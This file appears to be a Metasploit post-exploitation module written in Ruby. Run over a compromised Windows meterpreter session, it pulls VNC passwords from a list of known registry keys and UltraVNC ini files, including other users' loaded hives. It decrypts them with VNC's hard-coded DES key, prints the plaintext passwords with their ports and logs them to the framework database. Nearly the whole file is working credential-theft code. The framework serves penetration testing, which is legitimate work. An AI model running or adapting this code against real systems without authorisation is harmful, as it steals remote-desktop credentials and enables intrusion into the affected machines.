# post/windows/gather/enum_vnc_pw.rb

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/auxiliary/report'


class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather VNC Password Extraction',
        'Description'   => %q{
          This module extract DES encrypted passwords in known VNC locations
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Kurt Grutzmacher <grutz[at]jingojango.net>',
          'mubix'
        ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

  end

  def decrypt_hash(hash)
    if hash == nil
      return nil
    end
    # fixed des key
    # 5A B2 CD C0 BA DC AF 13
    fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
    pass = Rex::Proto::RFB::Cipher.decrypt ["#{hash}"].pack('H*'), fixedkey
    return pass
  end

  # Pull encrypted passwords from file based storage
  def file_get(filename,splitvar)
    begin
      client.fs.file.stat(filename)
      config = client.fs.file.new(filename,'r')
      parse = config.read.split
      value = parse.at(parse.index{|x| x =~ /#{splitvar}/}).split(splitvar)[1]
      return value
    rescue
      return nil
    end
  end



  # Pull encrypted passwords from registry based storage
  def reg_get(key,variable)
    begin
      root_key, base_key = session.sys.registry.splitkey(key)
      open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)

      data = open_key.query_value(variable).data
      if data.class == Fixnum
        return data
      else
        value = data.unpack('H*')[0].to_s
        return value
      end
    rescue
      # Registry value not found
      return nil
    end
  end

  def run

  '''
  Hash format
    :name,
    :check_file,
    :check_reg,
    :pass_variable,
    :port_variable,
    :port,
    :hash,
    :pass,
    :viewonly_variable,
    :viewonly_hash,
    :viewonly_pass
  '''

    locations = []

    #Checks
    locations << {:name => 'UltraVNC',
      :check_file => session.fs.file.expand_path("%PROGRAMFILES%")+'\\UltraVNC\\ultravnc.ini',
      :pass_variable => 'passwd=',
      :viewonly_variable => 'passwd2=',
      :port_variable => 'PortNumber='}

    locations << {:name => 'WinVNC3_HKLM',
      :check_reg => 'HKLM\\Software\\ORL\\WinVNC3',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC3_HKCU',
      :check_reg => 'HKCU\\Software\\ORL\\WinVNC3',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC3_HKLM_Default',
      :check_reg => 'HKLM\\Software\\ORL\\WinVNC3\\Default',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC3_HKCU_Default',
      :check_reg => 'HKCU\\Software\\ORL\\WinVNC3\\Default',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC_HKLM_Default',
      :check_reg => 'HKLM\\Software\\ORL\\WinVNC\\Default',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC_HKCU_Default',
      :check_reg => 'HKCU\\Software\\ORL\\WinVNC\\Default',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC4_HKLM',
      :check_reg => 'HKLM\\Software\\RealVNC\\WinVNC4',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'WinVNC4_HKCU',
      :check_reg => 'HKCU\\Software\\RealVNC\\WinVNC4',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'RealVNC_HKLM',
      :check_reg => 'HKLM\\Software\\RealVNC\\Default',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'RealVNC_HKCU',
      :check_reg => 'HKCU\\Software\\RealVNC\\Default',
      :pass_variable => 'Password',
      :port_variable => 'PortNumber'}

    locations << {:name => 'TightVNC_HKLM',
      :check_reg => 'HKLM\\Software\\TightVNC\\Server',
      :pass_variable => 'Password',
      :port_variable => 'RfbPort'}

    locations << {:name => 'TightVNC_HKLM_Control_pass',
      :check_reg => 'HKLM\\Software\\TightVNC\\Server',
      :pass_variable => 'ControlPassword',
      :port_variable => 'RfbPort'}

    userhives=load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil
      locations << {:name => "RealVNC_#{hive['SID']}",
        :check_reg => "#{hive['HKU']}\\Software\\RealVNC\\Default",
        :pass_variable => 'Password',
        :port_variable => 'PortNumber'}

      locations << {:name => "WinVNC4_#{hive['SID']}",
        :check_reg => "#{hive['HKU']}\\Software\\RealVNC\\WinVNC4",
        :pass_variable => 'Password',
        :port_variable => 'PortNumber'}

      locations << {:name => "WinVNC_#{hive['SID']}_Default",
        :check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC\\Default",
        :pass_variable => 'Password',
        :port_variable => 'PortNumber'}

      locations << {:name => "WinVNC3_#{hive['SID']}_Default",
        :check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC3\\Default",
        :pass_variable => 'Password',
        :port_variable => 'PortNumber'}

      locations << {:name => "WinVNC3_#{hive['SID']}",
        :check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC3",
        :pass_variable => 'Password',
        :port_variable => 'PortNumber'}
    end

    print_status("Enumerating VNC passwords on #{sysinfo['Computer']}")

    locations.map { |e|
      print_status("Checking #{e[:name]}...")
      if e.has_key?(:check_reg)
        e[:port] = reg_get(e[:check_reg],e[:port_variable])
        e[:hash] = reg_get(e[:check_reg],e[:pass_variable])
        e[:pass] = decrypt_hash(e[:hash])
        if e.has_key?(:viewonly_variable)
          e[:viewonly_hash] = reg_get(e[:check_reg],e[:viewonly_variable])
          e[:viewonly_pass] = decrypt_hash(e[:viewonly_hash])
        end
      elsif e.has_key?(:check_file)
        e[:port] = file_get(e[:check_file],e[:port_variable])
        e[:hash] = file_get(e[:check_file],e[:pass_variable])
        e[:pass] = decrypt_hash(e[:hash])
        if e.has_key?(:viewonly_variable)
          e[:viewonly_hash] = file_get(e[:check_file],e[:viewonly_variable])
          e[:viewonly_pass] = decrypt_hash(e[:viewonly_hash])
        end
      end
      #reporting
      if e[:pass] != nil
        if e[:port] == nil
          e[:port] = 5900
        end
        print_good("#{e[:name]} => #{e[:hash]} => #{e[:pass]} on port: #{e[:port]}")
        if session.db_record
          source_id = session.db_record.id
        else
          source_id = nil
        end
        report_auth_info(
          :host  => session.sock.peerhost,
          :sname => 'vnc',
          :pass  => "#{e[:pass]}",
          :port => "#{e[:port]}",
          :source_id => source_id,
          :source_type => "exploit",
          :type => 'password'
        )
      end
      if e[:viewonly_pass] != nil
        print_good("VIEW ONLY: #{e[:name]} => #{e[:viewonly_hash]} => #{e[:viewonly_pass]} on port: #{e[:port]}")
        if session.db_record
          source_id = session.db_record.id
        else
          source_id = nil
        end
        report_auth_info(
          :host  => session.sock.peerhost,
          :sname => 'vnc',
          :viewonly_pass  => "#{e[:viewonly_pass]}",
          :port => "#{e[:port]}",
          :source_id => source_id,
          :source_type => "exploit",
          :type => 'password_ro'
        )
      end
    }
    unload_our_hives(userhives)
  end
end
